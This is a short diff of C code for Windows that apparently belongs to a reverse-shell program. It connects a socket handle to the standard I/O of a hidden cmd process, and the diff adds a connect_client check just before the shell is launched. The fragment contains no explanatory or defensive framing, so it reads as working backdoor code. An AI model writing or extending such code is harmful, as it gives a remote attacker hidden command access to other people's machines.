@@ -40,6 +40,8 @@ int	main(int argc, char **argv, char **envp)
 		sinfo.hStdError = (HANDLE) fd;
 
 		PROCESS_INFORMATION pinfo;
+		if (connect_client(&fd) != 0)
+			return (0);
 		CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
 		
 		WSACleanup();
